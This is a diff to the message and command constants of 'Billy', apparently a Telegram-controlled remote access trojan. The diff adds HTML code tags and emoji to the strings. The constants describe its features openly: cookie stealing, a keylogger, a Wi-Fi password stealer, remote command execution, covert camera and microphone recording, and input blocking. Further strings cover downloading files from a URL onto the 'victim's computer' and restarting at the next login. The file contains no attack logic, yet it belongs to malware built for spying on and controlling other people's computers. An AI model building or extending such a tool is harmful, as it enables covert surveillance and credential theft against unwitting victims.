@@ -29,17 +29,17 @@ ADMIN_module = 'Admin'
 ADMIN_DELETE = 'admin/delete'
 ADMIN_DELETE_preview = 'Delete Billy'
 ADMIN_DELETE_command = 'delete'
-ADMIN_DELETE_documentation = f'This option delete Billy. If you sure, that you want to delete him, /{ADMIN_DELETE_command}.'
+ADMIN_DELETE_documentation = f'This option delete Billy. If you sure, that you want to delete him, <code>/{ADMIN_DELETE_command}</code>.'
 
 ADMIN_UPDATE = 'admin/update'
 ADMIN_UPDATE_preview = 'Update Billy'
 ADMIN_UPDATE_command = 'update'
-ADMIN_UPDATE_documentation = f'This option delete Billy. If you want to update him, /{ADMIN_UPDATE_command}.'
+ADMIN_UPDATE_documentation = f'This option delete Billy. If you want to update him, <code>/{ADMIN_UPDATE_command}</code>.'
 
 ADMIN_GETLOGS = 'admin/getlogs'
 ADMIN_GETLOGS_preview = 'Get logs'
 ADMIN_GETLOGS_command = 'getlogs'
-ADMIN_GETLOGS_documentation = f"This function allows you to retrieve logs. Response format: Log table.\nCommand: /{ADMIN_GETLOGS_command}"
+ADMIN_GETLOGS_documentation = f"This function allows you to retrieve logs. Response format: Log table.\nCommand: <code>/{ADMIN_GETLOGS_command}</code>."
 
 ADMIN_CLEARLOGS = 'admin/clearlogs'
 ADMIN_CLEARLOGS_preview = 'Clear logs'
@@ -48,13 +48,13 @@ ADMIN_CLEARLOGS_handler = 'Admin.clearlogs_callback'
 ADMIN_STOPBILLY = 'admin/stopBilly'
 ADMIN_STOPBILLY_preview = 'Stop Billy'
 ADMIN_STOPBILLY_command = 'stopBilly'
-ADMIN_STOPBILLY_documentation = f'This function allows you to temporarily stop Billy (until the next system boot).\nCommand: /{ADMIN_STOPBILLY_command}'
+ADMIN_STOPBILLY_documentation = f'This function allows you to temporarily stop Billy (until the next system boot).\nCommand: <code>/{ADMIN_STOPBILLY_command}</code>.'
 
 ADMIN_MANAGEPERMISSIONS = 'admin/managepermissions'
 ADMIN_MANAGEPERMISSIONS_preview = 'Manage permissions'
 ADMIN_MANAGEPERMISSIONS_handler = 'Admin.managepermissions_callback'
 ADMIN_MANAGEPERMISSIONS_command = 'managepermissions'
-ADMIN_MANAGEPERMISSIONS_documentation = f"This mode allows you to manage permissions. \nSyntax: /{ADMIN_MANAGEPERMISSIONS_command} [telegram id]\n"
+ADMIN_MANAGEPERMISSIONS_documentation = f"This mode allows you to manage permissions. \nSyntax: <code>/{ADMIN_MANAGEPERMISSIONS_command} [telegram id]</code>\n"
 
 SAVEPERMISSIONS = 'admin/savepermissions'
 SAVEPERMISSIONS_preview = 'Save'
@@ -79,7 +79,7 @@ BROWSER_module = 'Browser'
 BROWSER_OPENURL = 'browser/openurl'
 BROWSER_OPENURL_preview = "Open url"
 BROWSER_OPENURL_command = 'openurl'
-BROWSER_OPENURL_documentation = f'This mode allows you to ropen url in a browser. \nSyntax: /{BROWSER_OPENURL_command} [url].'
+BROWSER_OPENURL_documentation = f'This mode allows you to ropen url in a browser. \nSyntax: <code>/{BROWSER_OPENURL_command}</code> [url].'
 
 BROWSER_STEALCOOKIE = 'browser/stealcookie'
 BROWSER_STEALCOOKIE_preview = "Steal cookie"
@@ -98,13 +98,13 @@ CAMERA_SHOT = 'camera/shot'
 CAMERA_SHOT_preview = 'Shot'
 CAMERA_SHOT_handler = 'Camera.shot_callback'
 CAMERA_SHOT_command = 'camerashot'
-CAMERA_SHOT_documentation = f"This mode allows you to shot.\n{'{available_cameras}'} \nSyntax: /{CAMERA_SHOT_command} [device]."
+CAMERA_SHOT_documentation = f"This mode allows you to shot.\n{'{available_cameras}'} \nSyntax: <code>/{CAMERA_SHOT_command} [device]</code>."
 
 CAMERA_VIDEO = 'camera/video'
 CAMERA_VIDEO_preview = 'Video'
 CAMERA_VIDEO_handler = 'Camera.video_callback'
 CAMERA_VIDEO_command = 'cameravideo'
-CAMERA_VIDEO_documentation = f"This mode allows you to record a video.\n{'{available_cameras}'} \nSyntax: /{CAMERA_VIDEO_command} [device] [time] (seconds, no more than {'{max_time_to_camera}'} seconds)."
+CAMERA_VIDEO_documentation = f"This mode allows you to record a video.\n{'{available_cameras}'} \nSyntax: <code>/{CAMERA_VIDEO_command} [device] [time]</code> (seconds, no more than {'{max_time_to_camera}'} seconds)."
 
 
 COMMAND = 'command'
@@ -114,7 +114,7 @@ COMMAND_module = 'Command'
 COMMAND_RUNCOMMAND = 'command/runcommand'
 COMMAND_RUNCOMMAND_preview = 'Run command'
 COMMAND_RUNCOMMAND_command = 'runcommand'
-COMMAND_RUNCOMMAND_documentation = f"This mode allows you to run command. \nSyntax: /{COMMAND_RUNCOMMAND_command} [command]."
+COMMAND_RUNCOMMAND_documentation = f"This mode allows you to run command. \nSyntax: <code>/{COMMAND_RUNCOMMAND_command} [command]</code>."
 
 
 FILE = 'file'
@@ -124,41 +124,41 @@ FILE_module = 'File'
 FILE_GETINF = 'file/getinf'
 FILE_GETINF_preview = 'Get information'
 FILE_GETINF_command = 'getinffile'
-FILE_GETINF_documentation = f"This mode allows you to get information about file or directory. \nSyntax: /{FILE_GETINF_command} [path]."
+FILE_GETINF_documentation = f"This mode allows you to get information about file or directory. \nSyntax: <code>/{FILE_GETINF_command} [path]</code>."
 
 FILE_CREATEFILE = 'file/createfile'
 FILE_CREATEFILE_preview = 'Create file'
 FILE_CREATEFILE_command = 'createfile'
 FILE_CREATEFILE_handler = 'File.createfile_callback'
-FILE_CREATEFILE_documentation = f"This mode allows you to create file. \nSyntax: /{FILE_CREATEFILE_command} [path] {'{special_separator}'} [value]."
+FILE_CREATEFILE_documentation = f"This mode allows you to create file. \nSyntax: <code>/{FILE_CREATEFILE_command} [path] {'{special_separator}'} [value]</code>."
 
 FILE_CREATEDIR = 'file/createdir'
 FILE_CREATEDIR_preview = 'Create directory'
 FILE_CREATEDIR_command = 'createdir'
-FILE_CREATEDIR_documentation = f"This mode allows you to create directory. \nSyntax: /{FILE_CREATEDIR_command} [path]."
+FILE_CREATEDIR_documentation = f"This mode allows you to create directory. \nSyntax: <code>/{FILE_CREATEDIR_command} [path]</code>."
 
 FILE_COPY = 'file/copy'
 FILE_COPY_preview = 'Copy file'
 FILE_COPY_command = 'copyfile'
 FILE_COPY_handler = 'File.copy_callback'
-FILE_COPY_documentation = f"This mode allows you to copy file. \nSyntax: /{FILE_COPY_command} [path1] {'{special_separator}'} [path2]."
+FILE_COPY_documentation = f"This mode allows you to copy file. \nSyntax: <code>/{FILE_COPY_command} [path1] {'{special_separator}'} [path2]</code>."
 
 FILE_REMOVE = 'file/remove'
 FILE_REMOVE_preview = 'Remove file or dir'
 FILE_REMOVE_command = 'remove'
-FILE_REMOVE_documentation = f"This mode allows you to remove file or directory. \nSyntax: /{FILE_REMOVE_command} [path]."
+FILE_REMOVE_documentation = f"This mode allows you to remove file or directory. \nSyntax: <code>/{FILE_REMOVE_command} [path]</code>."
 
 FILE_UPLOAD = 'file/upload'
 FILE_UPLOAD_preview = 'Upload file'
 FILE_UPLOAD_command = 'upload'
 FILE_UPLOAD_handler = 'File.upload_callback'
-FILE_UPLOAD_documentation = f"This mode allows you to upload file to network drive. \nSyntax: /{FILE_UPLOAD_command} [file path]"
+FILE_UPLOAD_documentation = f"This mode allows you to upload file to network drive. \nSyntax: <code>/{FILE_UPLOAD_command} [file_path]</code>."
 
 FILE_DOWNLOAD = 'file/download'
 FILE_DOWNLOAD_preview = 'Download file'
 FILE_DOWNLOAD_command = 'download'
 FILE_UPLOAD_handler = 'File.download_callback'
-FILE_DOWNLOAD_documentation = f"This mode allows you to download file to victim's computer. \nSyntax: /{FILE_DOWNLOAD_command} [file path]. Also You must attach a file to a message."
+FILE_DOWNLOAD_documentation = f"This mode allows you to download file to victim's computer. \nSyntax: <code>/{FILE_DOWNLOAD_command} [file_url] {'{special_separator}'} [file_path]</code>"
 
 
 KEYBOARD = 'keyboard'
@@ -169,23 +169,23 @@ KEYBOARD_SPAM = 'keyboard/spam'
 KEYBOARD_SPAM_preview = 'Spam'
 KEYBOARD_SPAM_command = 'keyboardspam'
 KEYBOARD_SPAM_handler = 'Keyboard.spam_callback'
-KEYBOARD_SPAM_documentation = f"This mode allows you to randomly press keys for a certain amount of time. \nSyntax: /{KEYBOARD_SPAM_command} [time] (seconds, no more than {'{max_time_to_keyboard}'} seconds)."
+KEYBOARD_SPAM_documentation = f"This mode allows you to randomly press keys for a certain amount of time. \nSyntax: <code>/{KEYBOARD_SPAM_command} [time]</code> (seconds, no more than {'{max_time_to_keyboard}'} seconds)."
 
 KEYBOARD_SHORTCUT = 'keyboard/shortcut'
 KEYBOARD_SHORTCUT_preview = 'Press shortcut'
 KEYBOARD_SHORTCUT_command = 'keyboardshortcut'
-KEYBOARD_SHORTCUT_documentation = f"This mode allows you to press a key or keyboard shortcut. \nSyntax: /{KEYBOARD_SHORTCUT_command} key1+key2+key3."
+KEYBOARD_SHORTCUT_documentation = f"This mode allows you to press a key or keyboard shortcut. \nSyntax: <code>/{KEYBOARD_SHORTCUT_command} key1+key2+key3</code>."
 
 KEYBOARD_BLOCK = 'keyboard/block'
 KEYBOARD_BLOCK_preview = 'Block'
 KEYBOARD_BLOCK_command = 'keyboardblock'
 KEYBOARD_BLOCK_handler = 'Keyboard.block_callback'
-KEYBOARD_BLOCK_documentation = f"This mode allows you to block keyboard. \nSyntax: /{KEYBOARD_BLOCK_command} [time] (seconds, no more than {'{max_time_to_keyboard}'} seconds)."
+KEYBOARD_BLOCK_documentation = f"This mode allows you to block keyboard. \nSyntax: <code>/{KEYBOARD_BLOCK_command} [time]</code> (seconds, no more than {'{max_time_to_keyboard}'} seconds)."
 
 KEYBOARD_PRINT = 'keyboard/print'
 KEYBOARD_PRINT_preview = 'Print text'
 KEYBOARD_PRINT_command = 'keyboardprint'
-KEYBOARD_PRINT_documentation = f"This mode allows you to type text on the keyboard. \nSyntax: /{KEYBOARD_PRINT_command} [text]."
+KEYBOARD_PRINT_documentation = f"This mode allows you to type text on the keyboard. \nSyntax: <code>/{KEYBOARD_PRINT_command} [text]</code>."
 
 KEYLOGGER = 'keylogger'
 KEYLOGGER_preview = '\U0001f511 Keylogger'
@@ -227,7 +227,7 @@ MICROPHONE_RECORD = 'microphone/record'
 MICROPHONE_RECORD_preview = 'Record'
 MICROPHONE_RECORD_handler = 'Microphone.record_callback'
 MICROPHONE_RECORD_command = 'recordmicrophone'
-MICROPHONE_RECORD_documentation = f"This mode allows you to record audio from microphone. \nSyntax: /{MICROPHONE_RECORD_command} [device number] [time] (seconds, no more than {'{max_time_to_record_microphone}'} seconds).\nDevices:\n"
+MICROPHONE_RECORD_documentation = f"This mode allows you to record audio from microphone. \nSyntax: <code>/{MICROPHONE_RECORD_command} [device number] [time]</code> (seconds, no more than {'{max_time_to_record_microphone}'} seconds).\nDevices:\n"
 
 
 MOUSE = 'mouse'
@@ -237,12 +237,12 @@ MOUSE_module = 'Mouse'
 MOUSE_MOVE = 'mouse/move'
 MOUSE_MOVE_preview = 'Move'
 MOUSE_MOVE_command = 'movemouse'
-MOUSE_MOVE_documentation = f"This mode allows you to move a mouse. \nSyntax: /{MOUSE_MOVE_command} [x] [y]."
+MOUSE_MOVE_documentation = f"This mode allows you to move a mouse. \nSyntax: <code>/{MOUSE_MOVE_command} [x] [y]</code>."
 
 MOUSE_SCROLL = 'mouse/scroll'
 MOUSE_SCROLL_preview = 'Scroll'
 MOUSE_SCROLL_command = 'scrollmouse'
-MOUSE_SCROLL_documentation = f"This mode allows you to move a mouse. \nSyntax: /{MOUSE_SCROLL_command} [value]."
+MOUSE_SCROLL_documentation = f"This mode allows you to move a mouse. \nSyntax: <code>/{MOUSE_SCROLL_command} [value]</code>."
 
 MOUSE_LEFTCLICK = 'mouse/leftclick'
 MOUSE_LEFTCLICK_preview = 'Left click'
@@ -272,13 +272,13 @@ MOUSE_BLOCK = 'mouse/block'
 MOUSE_BLOCK_preview = 'Block'
 MOUSE_BLOCK_command = 'blockmouse'
 MOUSE_BLOCK_handler = 'Mouse.blockmouse_callback'
-MOUSE_BLOCK_documentation = f"This mode allows you to block mouse. \nSyntax: /{MOUSE_BLOCK_command} [time] (seconds, no more than {'{max_time_to_mouse}'} seconds)."
+MOUSE_BLOCK_documentation = f"This mode allows you to block mouse. \nSyntax: <code>/{MOUSE_BLOCK_command} [time]</code> (seconds, no more than {'{max_time_to_mouse}'} seconds)."
 
 MOUSE_SPAM = 'mouse/spam'
 MOUSE_SPAM_preview = 'Spam'
 MOUSE_SPAM_command = 'spammouse'
 MOUSE_SPAM_handler = 'Mouse.spammouse_callback'
-MOUSE_SPAM_documentation = f"This mode allows you to spam mouse. \nSyntax: /{MOUSE_SPAM_command} [time] (seconds, no more than {'{max_time_to_mouse}'} seconds)."
+MOUSE_SPAM_documentation = f"This mode allows you to spam mouse. \nSyntax: <code>/{MOUSE_SPAM_command} [time]</code> (seconds, no more than {'{max_time_to_mouse}'} seconds)."
 
 
 PHOTO = 'photo'
@@ -288,13 +288,13 @@ PHOTO_module = 'Photo'
 PHOTO_OPENPHOTO = 'photo/openphoto'
 PHOTO_OPENPHOTO_preview = 'Open photo'
 PHOTO_OPENPHOTO_command = 'openphoto'
-PHOTO_OPENPHOTO_documentation = f"This mode allows you to open photo by link. \nSyntax: /{PHOTO_OPENPHOTO_command} [link]."
+PHOTO_OPENPHOTO_documentation = f"This mode allows you to open photo by link. \nSyntax: <code>/{PHOTO_OPENPHOTO_command} [link]</code>."
 
 PHOTO_CHANGEWALLPAPERS = 'photo/changewallpapers'
 PHOTO_CHANGEWALLPAPERS_preview = 'Change wallpapers'
 PHOTO_CHANGEWALLPAPERS_command = 'changewallpapers'
 PHOTO_CHANGEWALLPAPERS_handler = 'Photo.changewallpapers_callback'
-PHOTO_CHANGEWALLPAPERS_documentation = f"This mode allows you to change wallpapers by link. \nSyntax: /{PHOTO_CHANGEWALLPAPERS_command} [link]."
+PHOTO_CHANGEWALLPAPERS_documentation = f"This mode allows you to change wallpapers by link. \nSyntax: <code>/{PHOTO_CHANGEWALLPAPERS_command} [link]</code>."
 
 
 RESTART = 'restart'
@@ -354,11 +354,11 @@ TEMP = 'temp'
 
 MANAGEPERMISSION_prefix = 'managepermission'
 
-INVALID_ARGUMENT = 'Invalid argument.'
+INVALID_ARGUMENT = '❌ Invalid argument.'
 
 PROCESSING = 'Processing...'
 
-TO_USE_MUST_BE_ROOT = 'To use this function, the program must be run with root.'
+TO_USE_MUST_BE_ROOT = '❗️To use this function, the program must be run with root.'
 
 
 menu_greeting_message = "\U0001f5a5 What would you do?"
@@ -366,11 +366,11 @@ menu_greeting_message = "\U0001f5a5 What would you do?"
 managepermissions_allow_message = 'Please press permissions you want to ALLOW:'
 managepermissions_forbid_message = 'Please press permissions you want to FORBID:'
 managepermissions_save_message = 'When you are done, save.'
-managepermissions_iderror_message = "Error. Invalid changeable id."
-savepermissions_saved_message = "Saved"
-resetpermissions_reseted_message = "Reseted"
-cancelpermissions_canceled_message = "Canceled"
-managepermissions_id_message = """ID: {id}
+managepermissions_iderror_message = "❌ Error. Invalid changeable id."
+savepermissions_saved_message = "✅ Saved"
+resetpermissions_reseted_message = "❌ Reseted"
+cancelpermissions_canceled_message = "❌ Canceled"
+managepermissions_id_message = """ID: <code>{id}</code>
 - allowed:
 {allowed}
 
@@ -381,62 +381,67 @@ keyboardblock_blocked_message = "Keyboard blocked"
 keyboardblock_unblocked_message = "Keyboard unblocked."
 keyboardspam_started_message = "Keyboard spam started."
 keyboardspam_finished_message = "Keyboard spam finished."
-keyboardprint_printed_message = "Text printed."
+keyboardprint_printed_message = "✅ Text printed."
 
 video_recording_started_message = "Recording started"
 video_recording_finished_message = "Recording finished"
 
-movemouse_moved_message = "Mouse moved."
+movemouse_moved_message = "✅ Mouse moved."
 
-scrollmouse_scrolled_message = "Mouse scrolled."
+scrollmouse_scrolled_message = "✅ Mouse scrolled."
 
 blockmouse_blocked_message = "Mouse blocked."
 blockmouse_unblocked_message = "Mouse unblocked."
 
 mousespam_started_message = "Mouse spam started."
 mousespam_finished_message = "Mouse spam finished."
-mouse_clicked_message = "Clicked."
-mousepress_pressed_message = 'Pressed.'
-mouseunpress_unpressed_message = 'Unpressed.'
+mouse_clicked_message = "✅ Mouse clicked."
+mousepress_pressed_message = '✅ Mouse pressed.'
+mouseunpress_unpressed_message = '✅ Mouse unpressed.'
 
 recordmicrophone_recording_started_message = "Recording started"
 recordmicrophone_recording_finished_message = "Recording finished"
 microphonegetdevices_devices_message = 'Devices:\n'
 
-openurl_opened_message = "Url opened."
+openurl_opened_message = "✅ Url opened."
 
-clearlogs_cleared_message = "Cleared."
+clearlogs_cleared_message = "✅ Cleared."
 
-stopbilly_stopped_message = "Stopped. Billy will be start in the next system login."
+stopbilly_stopped_message = "✅ Stopped. Billy will be start in the next system login."
 
-keylogger_statuschanged_message = 'Status changed -> {status}'
-keylogger_cleared_message = 'Cleared'
+keylogger_statuschanged_message = '✅ Status changed -> {status}.'
+keylogger_cleared_message = '✅ Cleared.'
 
 wifistealer_answer_message = 'NAME                              PASSWORD\n'
-seems_like_you_havent_wlan = "Seems like device haven't wlan."
+seems_like_you_havent_wlan = "❗️Seems like device haven't wlan."
 
-temp_message = "Sorry, but this function isn't supported."
+temp_message = "❌ Sorry, but this function isn't supported."
 
-command_not_found = "Command not found: "
+command_not_found = "❌ Command not found: "
 
-file_or_dir_is_not_exist = "File or dir is not exist."
-file_size_is_too_large = "The file size exceeds the {size_limit} MB limit."
-file_is_not_attached = "The file is not attached."
-file_or_directory_is_protected = "The file or directory is not allowed to be modified."
-invalid_file_path = "Invalid file path."
-invalid_file = "Invalid file."
+file_or_dir_is_not_exist = "❌ File or dir is not exist."
+file_size_is_too_large = "❌ The file size exceeds the {size_limit} MB limit."
+file_is_not_attached = "❌ The file is not attached."
+file_or_directory_is_protected = "❌ The file or directory is not allowed to be modified."
+invalid_file_path = "❌ Invalid file path."
+invalid_file = "❌ Invalid file."
 downloading_file = "Downloading file..."
 file_downloaded = """✅ The file was saved successfully!\n📁 Path: <code>{save_path}</code>\n📊 Size: {file_size:.2f} KB"""
 file_information_message = 'Size: {file_size} bytes\nDate of change: {file_mtime}.'
-file_removed_message = "File {file_path} removed."
-directory_removed_message = "Directory {dir_path} removed."
-file_created_message = "File {file_path} created."
-file_copied_message = "File copied from {file_path1} to {file_path1}."
-directory_created_message = "Directory {dir_path} created"
+file_removed_message = "✅ File <code>{file_path}</code> removed."
+directory_removed_message = "✅ Directory <code>{dir_path}</code> removed."
+file_created_message = "✅ File <code>{file_path}</code> created."
+file_copied_message = "✅ File copied from <code>{file_path1}</code> to <code>{file_path1}</code>."
+directory_created_message = "✅ Directory <code>{dir_path}</code> created"
+file_or_directory_is_protected = "❌ File or directory isn't allowed to changable."
+downloading_starting_message = "⏬ Downloading started...\nURL: {url}..."
+downloading_progress_message = "⏬ Downloading... {progress:.1f}%\n📊 {downloaded}KB / {total_size}KB"
+file_saved_message = "✅ File is saved!\n📁 Path: {save_path}\n📊 Size: {file_size:.2f} KB"
+downloading_error_mesage = "❌ Downloading error: HTTP {status}."
 
-system_restarted_message = f'System restarted.'
+system_restarted_message = f'✅ System restarted.'
 
-system_getIpMac_message = 'White ip: {white_ip}\nGray ip: {gray_ip}\nMAC: {MAC}'
+system_getIpMac_message = 'White ip: <code>{white_ip}</code>\nGray ip: <code>{gray_ip}</code>\nMAC: <code>{MAC}</code>'
 system_collect_system_info_message = \
     """System Information:
 Operating System: {os}
@@ -471,12 +476,12 @@ system_getprocesses_message = "Processes:\nName             Username         PID
 author_message = "Created by Serabobina."
 
 camera_devices_message = 'Camera devices:\n'
-you_havent_any_cameras = '! Seems like this device doesn\'t have any cameras.'
+you_havent_any_cameras = '❗️Seems like this device doesn\'t have any cameras.'
 
-Billy_deleted_windows_message = "Billy will be removed on the next system startup, but you can restart system."
-Billy_deleted_linux_message = "Billy is be removed."
+Billy_deleted_windows_message = "🫡 Billy will be removed on the next system startup, but you can restart system."
+Billy_deleted_linux_message = "🫡 Billy is be removed."
 
 keylogger_status_message = '\n\nStatus: {status}'
 
-image_opened_message = "Image opened."
-wallpaper_changed_message = "Wallpaper changed."
+image_opened_message = "✅ Image opened."
+wallpaper_changed_message = "✅ Wallpaper changed."
